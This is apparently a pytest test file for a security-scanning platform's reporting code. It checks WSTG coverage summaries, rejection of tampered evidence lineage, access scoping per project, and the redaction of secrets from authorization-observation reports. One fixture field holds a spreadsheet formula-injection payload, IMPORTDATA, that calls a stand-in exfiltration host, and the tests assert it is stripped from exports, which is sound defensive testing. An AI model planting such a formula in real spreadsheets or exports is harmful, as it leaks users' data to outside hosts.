from __future__ import annotations

from asgiref.sync import async_to_sync, sync_to_async
from django.db import connections
from fastapi import FastAPI
from fastapi.testclient import TestClient
import pytest

from django_project.assets.models import Asset
from django_project.audit.models import DataExport
from django_project.evidence.models import Evidence
from django_project.projects.models import Project
from django_project.scans.models import Scan
from django_project.users.models import User
from fastapi_app.core import dependencies as core_dependencies
from fastapi_app.routers import wstg as wstg_router
from fastapi_app.routers.reports import ReportCreate, _build_payload, _create_report, _make_csv
from fastapi_app.services.nmap_finding_ingestion import ingest_nmap_findings
from fastapi_app.services.wstg_observation_lineage import attach_wstg_evidence_metadata
from fastapi_app.services.wstg_reporting import build_wstg_project_coverage


def _fixture_project():
    owner = User.objects.create_user(
        email='wstg-report-owner@example.invalid',
        password='Strong-Test-Password-123!',
    )
    outsider = User.objects.create_user(
        email='wstg-report-outsider@example.invalid',
        password='Strong-Test-Password-123!',
    )
    project = Project.objects.create(
        name='WSTG Reporting Reality',
        slug='wstg-reporting-reality',
        owner=owner,
    )
    asset = Asset.objects.create(
        project=project,
        owner=owner,
        name='WSTG Reporting Target',
        slug='wstg-reporting-target',
        type=Asset.Type.IP_ADDRESS,
        configuration={'ip': '127.0.0.1'},
    )
    scan = Scan.objects.create(
        project=project,
        asset=asset,
        name='WSTG Reporting Nmap',
        scan_type=Scan.Type.IP,
        engines=['nmap'],
        initiated_by=owner,
    )
    evidence = Evidence.objects.create(
        scan=scan,
        asset=asset,
        source='nmap',
        evidence_type='scanner_output',
        raw_output='<nmaprun/>',
        metadata=attach_wstg_evidence_metadata(
            {'target': '127.0.0.1', 'exit_code': 0},
            'network.nmap',
        ),
        collected_by=owner,
    )
    ingest_nmap_findings(scan, evidence, {
        'hosts': [{
            'ip': '127.0.0.1',
            'ports': [{
                'port': 443,
                'protocol': 'tcp',
                'state': 'open',
                'service': 'https',
                'product': 'fixture',
                'version': '1',
            }],
        }],
    })
    tampered = attach_wstg_evidence_metadata({'target': '127.0.0.1'}, 'network.nmap')
    tampered['wstg_lineage']['lineage_fingerprint'] = '0' * 64
    Evidence.objects.create(
        scan=scan,
        asset=asset,
        source='nmap',
        evidence_type='scanner_output',
        raw_output='<tampered/>',
        metadata=tampered,
        collected_by=owner,
    )
    mismatched_source = attach_wstg_evidence_metadata({'target': '127.0.0.1'}, 'network.nmap')
    Evidence.objects.create(
        scan=scan,
        asset=asset,
        source='semgrep',
        evidence_type='scanner_output',
        raw_output='<mismatched-source/>',
        metadata=mismatched_source,
        collected_by=owner,
    )
    return owner, outsider, project, scan


@pytest.mark.django_db
def test_project_coverage_is_canonical_observation_only_and_rejects_tampered_lineage():
    _, _, project, _ = _fixture_project()

    coverage = build_wstg_project_coverage(project)

    assert coverage['contract_version'] == '1.1'
    assert coverage['methodology'] == 'WSTG'
    assert coverage['methodology_version'] == '4.2'
    assert coverage['source'] == 'postgresql'
    assert coverage['claim_policy'] == 'governed-methodology-completion'
    assert coverage['completion_claim_allowed'] is False
    assert coverage['finding_state_authority'] == 'governed-finding-confirmation'
    assert coverage['summary']['total_tests'] == 97
    assert coverage['summary']['observed_tests'] == 5
    assert coverage['summary']['completion_claim_supported_tests'] == 97
    assert 0 <= coverage['summary']['methodology_completed_tests'] <= coverage['summary']['observed_tests']
    assert coverage['summary']['trusted_evidence_records'] == 1
    assert coverage['summary']['trusted_finding_records'] == 1
    assert coverage['summary']['rejected_lineage_records'] == 2
    assert coverage['summary']['states']['observed'] == 5
    assert coverage['summary']['states']['manual_required'] == 21
    assert coverage['summary']['states']['not_observed'] == 70
    assert coverage['summary']['states']['inconclusive'] == 1

    rows = {item['wstg_id']: item for item in coverage['tests']}
    assert rows['WSTG-v42-INFO-02']['state'] == 'observed'
    assert rows['WSTG-v42-INFO-02']['evidence_records'] == 1
    assert rows['WSTG-v42-INFO-02']['finding_records'] == 1
    assert rows['WSTG-v42-INFO-02']['capability_ids'] == ['network.nmap']
    assert rows['WSTG-v42-IDNT-02']['state'] == 'manual_required'
    assert rows['WSTG-v42-INPV-04']['state'] == 'not_observed'
    assert rows['WSTG-v42-INPV-04']['completion_claim_supported'] is True
    assert rows['WSTG-v42-CLNT-08']['state'] == 'inconclusive'
    assert all(item['completion_claim_supported'] is True for item in coverage['tests'])
    assert all(item['state'] not in {'passed', 'failed'} for item in coverage['tests'])


@pytest.mark.django_db
def test_wstg_report_projection_reuses_same_coverage_contract():
    _, _, project, scan = _fixture_project()

    payload = async_to_sync(_build_payload)(str(project.id), str(scan.id), 'wstg')

    assert set(payload) == {'project', 'wstg_coverage'}
    assert payload['wstg_coverage']['scope_scan_id'] == str(scan.id)
    assert payload['wstg_coverage']['summary']['observed_tests'] == 5
    assert payload['wstg_coverage']['completion_claim_allowed'] is False
    assert payload['wstg_coverage']['summary']['completion_claim_supported_tests'] == 97
    csv_bytes = _make_csv(payload)
    csv_text = csv_bytes.decode('utf-8')
    assert 'WSTG-v42-INFO-02' in csv_text
    assert 'observation-only' not in csv_text
    assert 'observed' in csv_text


@pytest.mark.django_db
def test_wstg_json_report_persists_integrity_bound_artifact(settings, tmp_path):
    owner, _, project, _ = _fixture_project()
    settings.MEDIA_ROOT = tmp_path
    payload = async_to_sync(_build_payload)(str(project.id), None, 'wstg')
    body = ReportCreate(
        project_id=str(project.id),
        title='WSTG Observation Coverage',
        report_type='wstg',
        format='json',
        template_id='wstg',
    )

    report = async_to_sync(_create_report)(body, str(owner.id), payload)

    assert report.status == DataExport.Status.COMPLETED
    assert report.file_size > 0
    assert len(report.artifact_sha256) == 64
    assert report.record_count == 97
    report.file.open('rb')
    try:
        artifact = report.file.read().decode('utf-8')
    finally:
        report.file.close()
    assert '"methodology": "WSTG"' in artifact
    assert '"completion_claim_allowed": false' in artifact
    assert '"claim_policy": "governed-methodology-completion"' in artifact
    assert '"rejected_lineage_records": 2' in artifact


@pytest.mark.django_db(transaction=True)
def test_wstg_coverage_http_is_project_scoped_and_never_exposes_verdict_authority():
    owner, outsider, project, _ = _fixture_project()
    app = FastAPI()
    app.include_router(wstg_router.router, prefix='/api/v1/wstg')
    current = {'user_id': str(owner.id), 'is_staff': False}
    app.dependency_overrides[core_dependencies.get_current_user] = lambda: current
    client = TestClient(app)

    try:
        with client:
            response = client.get(f'/api/v1/wstg/projects/{project.id}/coverage')
            assert response.status_code == 200
            body = response.json()
            assert body['summary']['total_tests'] == 97
            assert body['summary']['observed_tests'] == 5
            assert body['summary']['completion_claim_supported_tests'] == 97
            assert body['summary']['methodology_completed_tests'] <= body['summary']['observed_tests']
            assert body['completion_claim_allowed'] is False
            assert 'passed' not in {item['state'] for item in body['tests']}
            assert 'failed' not in {item['state'] for item in body['tests']}

            current['user_id'] = str(outsider.id)
            denied = client.get(f'/api/v1/wstg/projects/{project.id}/coverage')
            assert denied.status_code == 404
    finally:
        if client.portal is not None:
            client.portal.call(sync_to_async(connections.close_all, thread_sensitive=True))
        app.dependency_overrides.clear()


@pytest.mark.django_db
def test_full_project_report_exposes_only_bounded_authorization_observation_lineage(
    monkeypatch, settings, tmp_path,
):
    """G3 mismatch evidence is not a finding or independently verified exploit."""
    import hashlib
    import json

    from enterprise.web_security_models import WebSecurityObservation, WebSecurityValidationRun
    from fastapi_app.routers import reports as report_module
    from fastapi_app.routers.reports import _make_pdf

    owner, outsider, project, scan = _fixture_project()
    foreign_project = Project.objects.create(
        name='Other Tenant Report', slug='other-tenant-report', owner=outsider,
    )
    local_run = WebSecurityValidationRun.objects.create(
        project=project, kind=WebSecurityValidationRun.Kind.AUTHORIZATION_MATRIX,
        status=WebSecurityValidationRun.Status.COMPLETED,
        input_sha256='a' * 64, summary={'total': 2, 'passed': 1, 'failed': 1},
        created_by=owner,
    )
    remote_run = WebSecurityValidationRun.objects.create(
        project=foreign_project, kind=WebSecurityValidationRun.Kind.AUTHORIZATION_MATRIX,
        status=WebSecurityValidationRun.Status.COMPLETED,
        input_sha256='b' * 64, summary={'total': 1, 'passed': 0, 'failed': 1},
        created_by=outsider,
    )

    def observe(run, case_ref, allowed, decision, passed, raw_secret):
        return WebSecurityObservation.objects.create(
            run=run, case_ref=case_ref, identity_ref='private-identity',
            identity_type='user', role='viewer', tenant_ref='private-tenant',
            resource_ref='private-resource', resource_tenant_ref='other-tenant',
            endpoint='/vulnerable/records/private-record',
            method='GET', operation='read', expected_allowed=allowed,
            observed_decision=decision, passed=passed,
            semantic={'private_raw': raw_secret, 'Authorization': 'Bearer do-not-export'},
            evidence_fingerprint='c' * 64,
        )

    observed_bad = observe(
        local_run, '=IMPORTDATA("https://exfil.invalid")',
        False, WebSecurityObservation.Decision.ALLOWED, False, 'secret-on-project',
    )
    observed_fixed = observe(
        local_run, 'fixed-differential', False,
        WebSecurityObservation.Decision.DENIED, True, 'private-response',
    )
    foreign = observe(
        remote_run, 'foreign-observation', False,
        WebSecurityObservation.Decision.ALLOWED, False, 'other-project-secret',
    )

    full = async_to_sync(_build_payload)(str(project.id), None, 'full')
    projection = full['authorization_observations']
    assert projection['schema'] == 'aegis.authorization-observation-report.v1'
    assert projection['claim_policy'] == 'observation-only'
    assert projection['finding_confirmation'] == 'not_established_by_observation'
    assert projection['independent_verification'] is False
    assert projection['total'] == projection['included'] == 2
    assert projection['policy_mismatch_total'] == 1
    assert projection['truncated'] is False
    assert {item['observation_id'] for item in projection['items']} == {
        str(observed_bad.pk), str(observed_fixed.pk),
    }
    assert all(item['run_id'] == str(local_run.pk) for item in projection['items'])
    assert all(item['observation_fingerprint'] == 'c' * 64 for item in projection['items'])
    assert str(foreign.pk) not in json.dumps(full)
    for secret in ('secret-on-project', 'private-response', 'other-project-secret',
                   'Bearer do-not-export', 'private-tenant', '/vulnerable/records/private-record',
                   '=IMPORTDATA'):
        assert secret not in json.dumps(full, sort_keys=True)
        assert secret not in _make_csv(full).decode('utf-8')

    csv_text = _make_csv(full).decode('utf-8')
    assert 'authorization_observation_summary,observation-only,2,1,2,False' in csv_text
    assert 'authorization_observation' in csv_text
    assert b'Authorization policy observations (not confirmed vulnerabilities)' in _make_pdf(
        full, 'G3 Authorized Observations',
    )

    settings.MEDIA_ROOT = tmp_path
    report = async_to_sync(_create_report)(
        ReportCreate(project_id=str(project.pk), title='G3 Policy Observations',
                     report_type='full', format='json'),
        str(owner.pk), full,
    )
    assert report.status == DataExport.Status.COMPLETED
    assert 'authorization_observations' in report.fields
    assert report.record_count == (
        len(full.get('findings', [])) + len(full.get('evidence', []))
        + len(full['wstg_coverage']['tests']) + 2
    )
    report.file.open('rb')
    try:
        artifact = report.file.read()
    finally:
        report.file.close()
    assert hashlib.sha256(artifact).hexdigest() == report.artifact_sha256
    assert len(json.loads(artifact)['authorization_observations']['items']) == 2

    # Validation runs are NOT Scan FK records; never contaminate an individual scan.
    scoped = async_to_sync(_build_payload)(str(project.pk), str(scan.pk), 'full')
    assert 'authorization_observations' not in scoped
    separate = async_to_sync(_build_payload)(str(project.pk), None, 'wstg')
    assert 'authorization_observations' not in separate

    # The projection has an explicit row budget; totals must not silently shrink.
    monkeypatch.setattr(report_module, '_MAX_AUTHORIZATION_OBSERVATIONS_IN_REPORT', 1)
    bounded = async_to_sync(_build_payload)(str(project.pk), None, 'full')
    assert bounded['authorization_observations']['total'] == 2
    assert bounded['authorization_observations']['included'] == 1
    assert bounded['authorization_observations']['truncated'] is True


@pytest.mark.django_db
def test_unqualified_authorization_run_does_not_claim_verified_finding():
    from enterprise.web_security_models import WebSecurityObservation, WebSecurityValidationRun

    owner, _, project, _ = _fixture_project()
    invalid_run = WebSecurityValidationRun.objects.create(
        project=project, kind=WebSecurityValidationRun.Kind.AUTHORIZATION_MATRIX,
        status=WebSecurityValidationRun.Status.FAILED, input_sha256='d' * 64,
        summary={'total': 1, 'passed': 0, 'failed': 1}, created_by=owner,
    )
    WebSecurityObservation.objects.create(
        run=invalid_run, case_ref='indeterminate-case', identity_ref='test',
        identity_type='user', resource_ref='record', endpoint='/record',
        method='GET', expected_allowed=False, observed_decision='error',
        passed=False, evidence_fingerprint='malformed',
    )
    payload = async_to_sync(_build_payload)(str(project.pk), None, 'full')
    projection = payload['authorization_observations']
    assert projection['total'] == 1 and projection['policy_mismatch_total'] == 0
    assert projection['independent_verification'] is False
    assert projection['items'][0]['run_status'] == 'failed'
    assert projection['items'][0]['observation_fingerprint'] is None
    assert 'confirmed' not in {item['observed_decision'] for item in projection['items']}
